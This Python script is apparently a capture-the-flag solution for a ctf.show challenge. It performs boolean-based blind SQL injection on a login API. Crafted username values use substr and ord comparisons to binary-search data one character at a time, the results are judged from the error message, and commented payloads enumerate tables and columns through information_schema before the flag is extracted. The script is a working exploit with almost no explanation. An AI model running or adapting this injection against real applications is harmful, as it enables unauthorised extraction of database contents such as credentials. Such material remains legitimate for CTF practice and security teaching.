#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/6/1 21:57
# blog: www.wlhhlc.top
import requests
url = "http://3a441b9a-d09d-49c2-ab18-f265f4000497.challenge.ctf.show/api/"
data = {'username':'',
        'password':123456}
flag = ''

for i in range(1,46):
    start = 32
    end = 127
    while start < end:
        mid = (start + end) >> 1
        #取表名：payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        #取字段名：payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
        payload = "select f1ag from ctfshow_fl0g"
        data['username'] = f"admin' and if(ord(substr(({payload}), {i} , 1)) > {mid}, 1, 2)=1#"
        res = requests.post(url=url, data=data)
        if "密码错误" in res.json()['msg']:
            start = mid +1
        else:
            end = mid
    flag = flag + chr(start)
    print(flag)
